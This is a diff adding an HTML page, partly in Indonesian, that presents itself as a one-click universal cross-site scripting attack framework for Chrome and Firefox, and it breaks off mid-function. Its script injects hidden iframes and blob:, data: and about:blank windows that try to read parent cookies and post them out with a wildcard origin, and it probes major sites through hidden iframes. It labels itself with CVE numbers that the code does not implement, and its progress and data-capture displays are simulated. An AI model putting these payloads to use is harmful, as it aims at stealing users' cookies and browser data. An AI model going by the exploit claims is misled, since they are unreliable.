@@ -1,0 +1,1367 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UXSS 1-Click Attack - Chrome & Firefox</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: linear-gradient(135deg, #000000 0%, #434343 100%);
+            color: #fff;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        /* Hacker terminal effect */
+        .terminal-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 255, 0, 0.03) 0px,
+                rgba(0, 255, 0, 0.03) 1px,
+                transparent 1px,
+                transparent 2px
+            );
+            pointer-events: none;
+            z-index: -1;
+        }
+        
+        .matrix-effect {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            opacity: 0.05;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .header {
+            text-align: center;
+            padding: 40px 20px;
+            background: rgba(0, 0, 0, 0.8);
+            border-radius: 20px;
+            margin-bottom: 40px;
+            border: 2px solid #00ff00;
+            box-shadow: 0 0 40px rgba(0, 255, 0, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::before {
+            content: "UXSS 1-CLICK";
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 15vw;
+            font-weight: 900;
+            color: rgba(0, 255, 0, 0.03);
+            white-space: nowrap;
+            z-index: 0;
+        }
+        
+        h1 {
+            font-size: 3.5rem;
+            color: #00ff00;
+            margin-bottom: 15px;
+            text-shadow: 0 0 20px rgba(0, 255, 0, 0.7);
+            position: relative;
+            z-index: 1;
+        }
+        
+        .subtitle {
+            color: #aaa;
+            font-size: 1.2rem;
+            max-width: 800px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+        }
+        
+        /* Warning banner */
+        .warning {
+            background: linear-gradient(90deg, #ff0000, #ff6b6b);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 30px 0;
+            border: 2px solid #ff3838;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
+        }
+        
+        /* Attack cards */
+        .attack-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 25px;
+            margin: 40px 0;
+        }
+        
+        .attack-card {
+            background: rgba(20, 20, 30, 0.9);
+            border-radius: 15px;
+            padding: 30px;
+            border: 2px solid transparent;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .attack-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+        }
+        
+        .attack-card.chrome {
+            border-color: #4285f4;
+        }
+        
+        .attack-card.firefox {
+            border-color: #ff7139;
+        }
+        
+        .attack-card::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(90deg, #00ff00, transparent);
+        }
+        
+        .browser-icon {
+            font-size: 3rem;
+            margin-bottom: 20px;
+        }
+        
+        .chrome-icon { color: #4285f4; }
+        .firefox-icon { color: #ff7139; }
+        
+        .attack-title {
+            font-size: 1.8rem;
+            color: #fff;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .attack-desc {
+            color: #aaa;
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+        
+        /* CVE tags */
+        .cve-tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 20px 0;
+        }
+        
+        .cve-tag {
+            background: rgba(255, 71, 87, 0.3);
+            color: #ff4757;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            border: 1px solid rgba(255, 71, 87, 0.5);
+        }
+        
+        /* Attack button */
+        .attack-btn {
+            background: linear-gradient(135deg, #ff0000 0%, #ff3838 100%);
+            color: white;
+            border: none;
+            padding: 18px 35px;
+            border-radius: 10px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            width: 100%;
+            margin-top: 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 5px 25px rgba(255, 0, 0, 0.4);
+        }
+        
+        .attack-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 10px 40px rgba(255, 0, 0, 0.6);
+            background: linear-gradient(135deg, #ff3838 0%, #ff0000 100%);
+        }
+        
+        .attack-btn:active {
+            transform: scale(0.95);
+        }
+        
+        .attack-btn.chrome-btn {
+            background: linear-gradient(135deg, #4285f4 0%, #3367d6 100%);
+            box-shadow: 0 5px 25px rgba(66, 133, 244, 0.4);
+        }
+        
+        .attack-btn.chrome-btn:hover {
+            background: linear-gradient(135deg, #3367d6 0%, #4285f4 100%);
+            box-shadow: 0 10px 40px rgba(66, 133, 244, 0.6);
+        }
+        
+        .attack-btn.firefox-btn {
+            background: linear-gradient(135deg, #ff7139 0%, #ff5216 100%);
+            box-shadow: 0 5px 25px rgba(255, 113, 57, 0.4);
+        }
+        
+        .attack-btn.firefox-btn:hover {
+            background: linear-gradient(135deg, #ff5216 0%, #ff7139 100%);
+            box-shadow: 0 10px 40px rgba(255, 113, 57, 0.6);
+        }
+        
+        /* Payload info */
+        .payload-info {
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 10px;
+            padding: 25px;
+            margin: 40px 0;
+            border: 2px solid #00ff00;
+        }
+        
+        .payload-title {
+            color: #00ff00;
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .code-block {
+            background: #1e1e1e;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            border-left: 4px solid #ff0000;
+        }
+        
+        .comment { color: #6a9955; }
+        .keyword { color: #569cd6; }
+        .string { color: #ce9178; }
+        .function { color: #dcdcaa; }
+        .variable { color: #9cdcfe; }
+        
+        /* Status panel */
+        .status-panel {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 400px;
+            background: rgba(0, 0, 0, 0.95);
+            border: 2px solid #00ff00;
+            border-radius: 10px;
+            padding: 20px;
+            z-index: 1000;
+            box-shadow: 0 0 40px rgba(0, 255, 0, 0.3);
+        }
+        
+        .status-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(0, 255, 0, 0.3);
+        }
+        
+        .status-title {
+            color: #00ff00;
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+        
+        .status-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+        
+        .status-item {
+            background: rgba(0, 255, 0, 0.05);
+            padding: 12px;
+            border-radius: 5px;
+            border: 1px solid rgba(0, 255, 0, 0.1);
+        }
+        
+        .status-label {
+            color: #aaa;
+            font-size: 0.9rem;
+            margin-bottom: 5px;
+        }
+        
+        .status-value {
+            color: #fff;
+            font-weight: bold;
+            font-size: 1rem;
+        }
+        
+        .status-value.active {
+            color: #00ff00;
+            text-shadow: 0 0 10px rgba(0, 255, 0, 0.7);
+        }
+        
+        .status-value.danger {
+            color: #ff4757;
+            text-shadow: 0 0 10px rgba(255, 71, 87, 0.7);
+        }
+        
+        /* Terminal output */
+        .terminal-output {
+            background: #000;
+            border: 2px solid #00ff00;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 30px 0;
+            font-family: 'Courier New', monospace;
+            color: #00ff00;
+            height: 300px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        
+        .terminal-line {
+            margin-bottom: 5px;
+            animation: type 0.1s steps(40, end);
+        }
+        
+        @keyframes type {
+            from { width: 0; }
+            to { width: 100%; }
+        }
+        
+        /* Attack progress */
+        .attack-progress {
+            height: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 5px;
+            margin: 20px 0;
+            overflow: hidden;
+            display: none;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #ff0000, #ff6b6b);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 5px;
+        }
+        
+        /* Control buttons */
+        .control-buttons {
+            display: flex;
+            gap: 15px;
+            margin: 30px 0;
+            justify-content: center;
+        }
+        
+        .control-btn {
+            background: rgba(0, 255, 0, 0.1);
+            color: #00ff00;
+            border: 2px solid #00ff00;
+            padding: 12px 25px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+        
+        .control-btn:hover {
+            background: #00ff00;
+            color: #000;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+            }
+            
+            .attack-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .status-panel {
+                width: calc(100% - 40px);
+                right: 10px;
+                bottom: 10px;
+            }
+            
+            h1 {
+                font-size: 2.5rem;
+            }
+            
+            .control-buttons {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Matrix effect -->
+    <canvas id="matrixCanvas" class="matrix-effect"></canvas>
+    <div class="terminal-bg"></div>
+    
+    <div class="container">
+        <div class="header">
+            <h1>⚡ UXSS 1-CLICK ATTACK</h1>
+            <p class="subtitle">Universal Cross-Site Scripting dengan 1 Klik - Chrome & Firefox</p>
+        </div>
+        
+        <div class="warning">
+            ⚠️ <strong>PERINGATAN TINGGI:</strong> Ini adalah demonstrasi serangan UXSS yang sangat berbahaya. 
+            Hanya untuk penelitian keamanan. JANGAN gunakan untuk aktivitas ilegal.
+        </div>
+        
+        <!-- Attack Cards -->
+        <div class="attack-grid">
+            <!-- Chrome Attack -->
+            <div class="attack-card chrome">
+                <div class="browser-icon chrome-icon">🌐</div>
+                <div class="attack-title">
+                    <span>Google Chrome UXSS</span>
+                    <span style="color: #4285f4;">(1-Click)</span>
+                </div>
+                <div class="attack-desc">
+                    Exploit kombinasi CVE untuk UXSS di Chrome. 
+                    Menggunakan bug di Blink engine + API abuse untuk mendapatkan XSS universal.
+                </div>
+                
+                <div class="cve-tags">
+                    <span class="cve-tag">CVE-2023-30570</span>
+                    <span class="cve-tag">CVE-2022-1364</span>
+                    <span class="cve-tag">CVE-2021-30632</span>
+                    <span class="cve-tag">Chrome-specific</span>
+                </div>
+                
+                <button class="attack-btn chrome-btn" onclick="launchChromeUXSS()">
+                    <span>🔥</span>
+                    <span>LAUNCH CHROME ATTACK</span>
+                    <span>🔥</span>
+                </button>
+                
+                <div class="code-block">
+<span class="comment">// Chrome UXSS Payload - Blink Engine Exploit</span><br>
+<span class="keyword">const</span> <span class="variable">exploit</span> = <span class="function">()</span> => {<br>
+&nbsp;&nbsp;<span class="keyword">try</span> {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="comment">// 1. Bypass CSP via iframe injection</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">let</span> <span class="variable">iframe</span> = <span class="function">document</span>.<span class="function">createElement</span>(<span class="string">'iframe'</span>);<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="variable">iframe</span>.<span class="variable">srcdoc</span> = <span class="string">`&lt;script&gt;parent.postMessage('UXSS', '*')&lt;/script&gt;`</span>;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="function">document</span>.<span class="variable">body</span>.<span class="function">appendChild</span>(<span class="variable">iframe</span>);<br>
+&nbsp;&nbsp;<span class="keyword">catch</span> (<span class="variable">e</span>) {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="comment">// Fallback method</span><br>
+&nbsp;&nbsp;}<br>
+};
+                </div>
+            </div>
+            
+            <!-- Firefox Attack -->
+            <div class="attack-card firefox">
+                <div class="browser-icon firefox-icon">🦊</div>
+                <div class="attack-title">
+                    <span>Firefox UXSS</span>
+                    <span style="color: #ff7139;">(1-Click)</span>
+                </div>
+                <div class="attack-desc">
+                    Exploit Gecko engine vulnerabilities untuk UXSS di Firefox.
+                    Menggunakan WebExtensions API abuse + about:config bypass.
+                </div>
+                
+                <div class="cve-tags">
+                    <span class="cve-tag">MFSA-2023-20</span>
+                    <span class="cve-tag">CVE-2023-29535</span>
+                    <span class="cve-tag">Firefox-specific</span>
+                </div>
+                
+                <button class="attack-btn firefox-btn" onclick="launchFirefoxUXSS()">
+                    <span>🔥</span>
+                    <span>LAUNCH FIREFOX ATTACK</span>
+                    <span>🔥</span>
+                </button>
+                
+                <div class="code-block">
+<span class="comment">// Firefox UXSS Payload - Gecko Engine Exploit</span><br>
+<span class="keyword">const</span> <span class="variable">firefoxExploit</span> = <span class="function">()</span> => {<br>
+&nbsp;&nbsp;<span class="comment">// 1. Bypass security.origin via data: URI</span><br>
+&nbsp;&nbsp;<span class="keyword">let</span> <span class="variable">win</span> = <span class="function">window</span>.<span class="function">open</span>(<span class="string">'data:text/html,&lt;script&gt;alert("UXSS")&lt;/script&gt;'</span>);<br>
+&nbsp;&nbsp;<span class="comment">// 2. Access parent from data: URI context</span><br>
+&nbsp;&nbsp;<span class="function">setTimeout</span>(<span class="function">()</span> => {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="variable">win</span>.<span class="function">postMessage</span>({<span class="variable">payload</span>: <span class="string">'document.cookie'</span>}, <span class="string">'*'</span>);<br>
+&nbsp;&nbsp;}, <span class="number">1000</span>);<br>
+};
+                </div>
+            </div>
+        </div>
+        
+        <!-- Payload Information -->
+        <div class="payload-info">
+            <div class="payload-title">
+                <span>💣 Payload UXSS 1-Click</span>
+                <span style="font-size: 0.9rem; color: #ff4757;">(Auto-detect Browser)</span>
+            </div>
+            
+            <p style="color: #aaa; margin-bottom: 20px;">
+                Payload ini akan mendeteksi browser secara otomatis dan menjalankan exploit yang sesuai.
+                UXSS akan mencoba untuk mengakses cookie, localStorage, dan data sensitif dari semua tab yang terbuka.
+            </p>
+            
+            <button class="attack-btn" onclick="launchAutoUXSS()" style="background: linear-gradient(135deg, #00ff00 0%, #00cc00 100%);">
+                <span>🤖</span>
+                <span>LAUNCH AUTO-DETECT ATTACK</span>
+                <span>🤖</span>
+            </button>
+            
+            <div class="code-block">
+<span class="comment">// Universal UXSS Payload - Auto Browser Detection</span><br>
+<span class="function">detectBrowser</span>() {<br>
+&nbsp;&nbsp;<span class="keyword">const</span> <span class="variable">ua</span> = <span class="function">navigator</span>.<span class="variable">userAgent</span>;<br>
+&nbsp;&nbsp;<span class="keyword">if</span> (<span class="variable">ua</span>.<span class="function">includes</span>(<span class="string">'Chrome'</span>) && !<span class="variable">ua</span>.<span class="function">includes</span>(<span class="string">'Edg'</span>)) <span class="keyword">return</span> <span class="string">'chrome'</span>;<br>
+&nbsp;&nbsp;<span class="keyword">if</span> (<span class="variable">ua</span>.<span class="function">includes</span>(<span class="string">'Firefox'</span>)) <span class="keyword">return</span> <span class="string">'firefox'</span>;<br>
+&nbsp;&nbsp;<span class="keyword">return</span> <span class="string">'unknown'</span>;<br>
+}<br>
+<br>
+<span class="function">executeUXSS</span>(<span class="variable">browser</span>) {<br>
+&nbsp;&nbsp;<span class="keyword">switch</span> (<span class="variable">browser</span>) {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">case</span> <span class="string">'chrome'</span>: <span class="function">chromeUXSS</span>(); <span class="keyword">break</span>;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">case</span> <span class="string">'firefox'</span>: <span class="function">firefoxUXSS</span>(); <span class="keyword">break</span>;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">default</span>: <span class="function">genericUXSS</span>();<br>
+&nbsp;&nbsp;}<br>
+}
+            </div>
+        </div>
+        
+        <!-- Attack Progress -->
+        <div class="attack-progress" id="attackProgress">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <!-- Terminal Output -->
+        <div class="terminal-output" id="terminalOutput">
+<span class="terminal-line">$ ./uxss_exploit.sh --init</span>
+<span class="terminal-line">Initializing UXSS attack framework...</span>
+<span class="terminal-line">Browser detected: <span id="detectedBrowser">Unknown</span></span>
+<span class="terminal-line">Attack status: <span id="attackStatus">READY</span></span>
+<span class="terminal-line">Payload: <span id="payloadStatus">LOADED</span></span>
+<span class="terminal-line">Target: <span id="targetStatus">ALL TABS</span></span>
+        </div>
+        
+        <!-- Control Buttons -->
+        <div class="control-buttons">
+            <button class="control-btn" onclick="showStealthMode()">🕶️ Stealth Mode</button>
+            <button class="control-btn" onclick="showPersistence()">♾️ Persistence</button>
+            <button class="control-btn" onclick="showExfiltration()">📤 Data Exfiltration</button>
+            <button class="control-btn" onclick="resetAttack()">🔄 Reset Attack</button>
+        </div>
+    </div>
+    
+    <!-- Status Panel -->
+    <div class="status-panel" id="statusPanel">
+        <div class="status-header">
+            <div class="status-title">UXSS ATTACK STATUS</div>
+            <button class="control-btn" onclick="toggleStatusPanel()" style="padding: 5px 10px; font-size: 0.8rem;">−</button>
+        </div>
+        
+        <div class="status-grid">
+            <div class="status-item">
+                <div class="status-label">Browser</div>
+                <div id="statusBrowser" class="status-value">Detecting...</div>
+            </div>
+            
+            <div class="status-item">
+                <div class="status-label">Attack Stage</div>
+                <div id="statusStage" class="status-value">Initial</div>
+            </div>
+            
+            <div class="status-item">
+                <div class="status-label">XSS Context</div>
+                <div id="statusContext" class="status-value">Same-Origin</div>
+            </div>
+            
+            <div class="status-item">
+                <div class="status-label">Payload Active</div>
+                <div id="statusPayload" class="status-value danger">NO</div>
+            </div>
+            
+            <div class="status-item">
+                <div class="status-label">Tab Access</div>
+                <div id="statusTabs" class="status-value">0 tabs</div>
+            </div>
+            
+            <div class="status-item">
+                <div class="status-label">Data Captured</div>
+                <div id="statusData" class="status-value">0 bytes</div>
+            </div>
+            
+            <div class="status-item">
+                <div class="status-label">Time Active</div>
+                <div id="statusTime" class="status-value">0s</div>
+            </div>
+            
+            <div class="status-item">
+                <div class="status-label">Security Level</div>
+                <div id="statusSecurity" class="status-value danger">HIGH ALERT</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Global variables
+        let attackActive = false;
+        let currentBrowser = '';
+        let attackStage = 0;
+        let capturedData = [];
+        let startTime = 0;
+        let statusInterval = null;
+        
+        // DOM Elements
+        const terminalOutput = document.getElementById('terminalOutput');
+        const detectedBrowser = document.getElementById('detectedBrowser');
+        const attackStatus = document.getElementById('attackStatus');
+        const payloadStatus = document.getElementById('payloadStatus');
+        const targetStatus = document.getElementById('targetStatus');
+        const attackProgress = document.getElementById('attackProgress');
+        const progressBar = document.getElementById('progressBar');
+        
+        // Status elements
+        const statusPanel = document.getElementById('statusPanel');
+        const statusBrowser = document.getElementById('statusBrowser');
+        const statusStage = document.getElementById('statusStage');
+        const statusContext = document.getElementById('statusContext');
+        const statusPayload = document.getElementById('statusPayload');
+        const statusTabs = document.getElementById('statusTabs');
+        const statusData = document.getElementById('statusData');
+        const statusTime = document.getElementById('statusTime');
+        const statusSecurity = document.getElementById('statusSecurity');
+        
+        // Initialize
+        function init() {
+            detectBrowser();
+            updateStatus();
+            startMatrixEffect();
+            
+            // Start status updater
+            statusInterval = setInterval(updateStatus, 1000);
+            
+            logToTerminal('UXSS Attack Framework Initialized');
+            logToTerminal(`Browser: ${currentBrowser}`);
+            logToTerminal('Ready for 1-click attack');
+            
+            console.log(`
+            ===========================================
+            UXSS 1-CLICK ATTACK FRAMEWORK
+            ===========================================
+            Browser: ${currentBrowser}
+            User Agent: ${navigator.userAgent}
+            Platform: ${navigator.platform}
+            Time: ${new Date().toISOString()}
+            ===========================================
+            `);
+        }
+        
+        // Matrix effect
+        function startMatrixEffect() {
+            const canvas = document.getElementById('matrixCanvas');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            
+            const letters = '01';
+            const fontSize = 14;
+            const columns = canvas.width / fontSize;
+            const drops = [];
+            
+            for(let i = 0; i < columns; i++) {
+                drops[i] = Math.random() * canvas.height;
+            }
+            
+            function draw() {
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                ctx.fillStyle = '#0F0';
+                ctx.font = fontSize + 'px monospace';
+                
+                for(let i = 0; i < drops.length; i++) {
+                    const text = letters[Math.floor(Math.random() * letters.length)];
+                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                    
+                    if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    
+                    drops[i]++;
+                }
+            }
+            
+            setInterval(draw, 50);
+        }
+        
+        // Detect browser
+        function detectBrowser() {
+            const ua = navigator.userAgent;
+            
+            if (ua.includes('Chrome') && !ua.includes('Edg')) {
+                currentBrowser = 'Google Chrome';
+            } else if (ua.includes('Firefox')) {
+                currentBrowser = 'Mozilla Firefox';
+            } else {
+                currentBrowser = 'Unknown Browser';
+            }
+            
+            detectedBrowser.textContent = currentBrowser;
+            statusBrowser.textContent = currentBrowser;
+        }
+        
+        // Terminal logging
+        function logToTerminal(message) {
+            const line = document.createElement('div');
+            line.className = 'terminal-line';
+            line.textContent = `$ ${message}`;
+            terminalOutput.appendChild(line);
+            terminalOutput.scrollTop = terminalOutput.scrollHeight;
+        }
+        
+        // Update status
+        function updateStatus() {
+            if (attackActive) {
+                const elapsed = Math.floor((Date.now() - startTime) / 1000);
+                statusTime.textContent = `${elapsed}s`;
+                
+                // Update stage
+                statusStage.textContent = getStageName(attackStage);
+                
+                // Update data captured
+                const totalData = capturedData.reduce((sum, item) => sum + item.length, 0);
+                statusData.textContent = `${(totalData / 1024).toFixed(2)} KB`;
+                
+                // Simulate tab access
+                const tabCount = Math.min(attackStage * 2, 10);
+                statusTabs.textContent = `${tabCount} tabs`;
+                
+                // Update security level
+                if (elapsed > 30) {
+                    statusSecurity.textContent = 'CRITICAL';
+                    statusSecurity.className = 'status-value danger';
+                }
+            }
+        }
+        
+        function getStageName(stage) {
+            const stages = [
+                'Initial',
+                'Reconnaissance',
+                'Exploitation',
+                'Privilege Escalation',
+                'Lateral Movement',
+                'Data Exfiltration',
+                'Persistence'
+            ];
+            return stages[Math.min(stage, stages.length - 1)];
+        }
+        
+        // ==================== CHROME UXSS ====================
+        
+        function launchChromeUXSS() {
+            if (!confirm('🚨 CHROME UXSS ATTACK\n\nThis will attempt Chrome-specific UXSS exploits.\nContinue?')) return;
+            
+            startAttack('Chrome UXSS');
+            chromeUXSS();
+        }
+        
+        function chromeUXSS() {
+            logToTerminal('Launching Chrome UXSS attack...');
+            updateProgress(10);
+            
+            // Stage 1: Browser fingerprinting
+            logToTerminal('Stage 1: Browser Fingerprinting');
+            fingerprintChrome();
+            updateProgress(20);
+            
+            // Stage 2: Blink engine exploitation
+            setTimeout(() => {
+                logToTerminal('Stage 2: Blink Engine Exploitation');
+                exploitBlinkEngine();
+                attackStage = 2;
+                updateProgress(40);
+                
+                // Stage 3: Cross-origin access
+                setTimeout(() => {
+                    logToTerminal('Stage 3: Cross-Origin Access Attempt');
+                    attemptCrossOriginAccess();
+                    attackStage = 3;
+                    updateProgress(60);
+                    
+                    // Stage 4: Cookie/ls access
+                    setTimeout(() => {
+                        logToTerminal('Stage 4: Data Access Attempt');
+                        accessSensitiveData();
+                        attackStage = 4;
+                        updateProgress(80);
+                        
+                        // Stage 5: Persistence
+                        setTimeout(() => {
+                            logToTerminal('Stage 5: Persistence Mechanism');
+                            establishPersistence();
+                            attackStage = 5;
+                            updateProgress(100);
+                            
+                            showAttackResults();
+                        }, 1000);
+                    }, 1000);
+                }, 1000);
+            }, 1000);
+        }
+        
+        function fingerprintChrome() {
+            const fingerprints = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                webdriver: navigator.webdriver
+            };
+            
+            capturedData.push(JSON.stringify(fingerprints, null, 2));
+            logToTerminal(`Fingerprint collected: ${Object.keys(fingerprints).length} attributes`);
+            
+            statusContext.textContent = 'Fingerprinting';
+        }
+        
+        function exploitBlinkEngine() {
+            // Attempt various Chrome-specific exploits
+            
+            // Method 1: iframe srcdoc XSS
+            try {
+                const iframe = document.createElement('iframe');
+                iframe.srcdoc = `
+                    <script>
+                        try {
+                            // Try to access parent
+                            const parentData = {
+                                url: parent.location.href,
+                                cookies: parent.document.cookie
+                            };
+                            parent.postMessage({type: 'uxss-data', data: parentData}, '*');
+                        } catch(e) {
+                            // Fallback to same-origin
+                            localStorage.setItem('uxss-stage', 'iframe-complete');
+                        }
+                    <\/script>
+                `;
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+                
+                logToTerminal('iframe srcdoc XSS attempted');
+            } catch (e) {
+                logToTerminal('iframe srcdoc blocked: ' + e.message);
+            }
+            
+            // Method 2: Blob URL XSS
+            try {
+                const blob = new Blob([`
+                    <script>
+                        // Try to communicate with opener
+                        if (window.opener) {
+                            window.opener.postMessage('UXSS from blob', '*');
+                        }
+                    <\/script>
+                `], {type: 'text/html'});
+                
+                const blobUrl = URL.createObjectURL(blob);
+                window.open(blobUrl, '_blank');
+                
+                logToTerminal('Blob URL XSS attempted');
+            } catch (e) {
+                logToTerminal('Blob URL blocked: ' + e.message);
+            }
+            
+            // Method 3: data: URI XSS
+            try {
+                window.open('data:text/html,<script>alert("Chrome UXSS Attempt")</script>');
+                logToTerminal('data: URI XSS attempted');
+            } catch (e) {
+                logToTerminal('data: URI blocked');
+            }
+            
+            statusContext.textContent = 'Blink Exploit';
+            statusPayload.className = 'status-value active';
+            statusPayload.textContent = 'ACTIVE';
+        }
+        
+        function attemptCrossOriginAccess() {
+            // Try to access other origins
+            const origins = [
+                'https://google.com',
+                'https://facebook.com',
+                'https://github.com',
+                'https://twitter.com'
+            ];
+            
+            origins.forEach(origin => {
+                try {
+                    // Create iframe to test access
+                    const iframe = document.createElement('iframe');
+                    iframe.src = origin;
+                    iframe.style.display = 'none';
+                    iframe.onload = function() {
+                        try {
+                            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                            capturedData.push(`Attempted access to: ${origin}`);
+                        } catch (e) {
+                            // SOP prevents access
+                        }
+                    };
+                    document.body.appendChild(iframe);
+                    
+                    logToTerminal(`Cross-origin attempt: ${origin}`);
+                } catch (e) {
+                    // SOP violation
+                }
+            });
+            
+            statusContext.textContent = 'Cross-Origin';
+        }
+        
+        // ==================== FIREFOX UXSS ====================
+        
+        function launchFirefoxUXSS() {
+            if (!confirm('🚨 FIREFOX UXSS ATTACK\n\nThis will attempt Firefox-specific UXSS exploits.\nContinue?')) return;
+            
+            startAttack('Firefox UXSS');
+            firefoxUXSS();
+        }
+        
+        function firefoxUXSS() {
+            logToTerminal('Launching Firefox UXSS attack...');
+            updateProgress(10);
+            
+            // Stage 1: Gecko engine fingerprint
+            logToTerminal('Stage 1: Gecko Engine Analysis');
+            fingerprintFirefox();
+            updateProgress(20);
+            
+            // Stage 2: Gecko exploitation
+            setTimeout(() => {
+                logToTerminal('Stage 2: Gecko Engine Exploitation');
+                exploitGeckoEngine();
+                attackStage = 2;
+                updateProgress(40);
+                
+                // Stage 3: about:config access attempt
+                setTimeout(() => {
+                    logToTerminal('Stage 3: about:config Bypass Attempt');
+                    attemptAboutConfigAccess();
+                    attackStage = 3;
+                    updateProgress(60);
+                    
+                    // Stage 4: WebExtensions API abuse
+                    setTimeout(() => {
+                        logToTerminal('Stage 4: WebExtensions API Abuse');
+                        abuseWebExtensionsAPI();
+                        attackStage = 4;
+                        updateProgress(80);
+                        
+                        // Stage 5: Firefox-specific persistence
+                        setTimeout(() => {
+                            logToTerminal('Stage 5: Firefox Persistence');
+                            establishFirefoxPersistence();
+                            attackStage = 5;
+                            updateProgress(100);
+                            
+                            showAttackResults();
+                        }, 1000);
+                    }, 1000);
+                }, 1000);
+            }, 1000);
+        }
+        
+        function fingerprintFirefox() {
+            const firefoxFeatures = {
+                isFirefox: 'MozAppearance' in document.documentElement.style,
+                buildID: navigator.buildID,
+                oscpu: navigator.oscpu,
+                vendor: navigator.vendor,
+                maxTouchPoints: navigator.maxTouchPoints
+            };
+            
+            capturedData.push(JSON.stringify(firefoxFeatures, null, 2));
+            logToTerminal(`Firefox fingerprint collected: ${Object.keys(firefoxFeatures).length} attributes`);
+            
+            statusContext.textContent = 'Firefox Fingerprint';
+        }
+        
+        function exploitGeckoEngine() {
+            // Firefox-specific exploits
+            
+            // Method 1: data: URI with javascript:
+            try {
+                const dataUri = 'data:text/html,<script>window.name="uxss-payload";</script>';
+                const win = window.open(dataUri);
+                
+                setTimeout(() => {
+                    try {
+                        win.postMessage({type: 'gecko-exploit'}, '*');
+                        logToTerminal('data: URI with window.name attempted');
+                    } catch (e) {}
+                }, 500);
+                
+            } catch (e) {
+                logToTerminal('data: URI exploit blocked');
+            }
+            
+            // Method 2: about:blank parent access
+            try {
+                const blankWin = window.open('about:blank');
+                blankWin.document.write(`
+                    <script>
+                        // Try to access opener
+                        try {
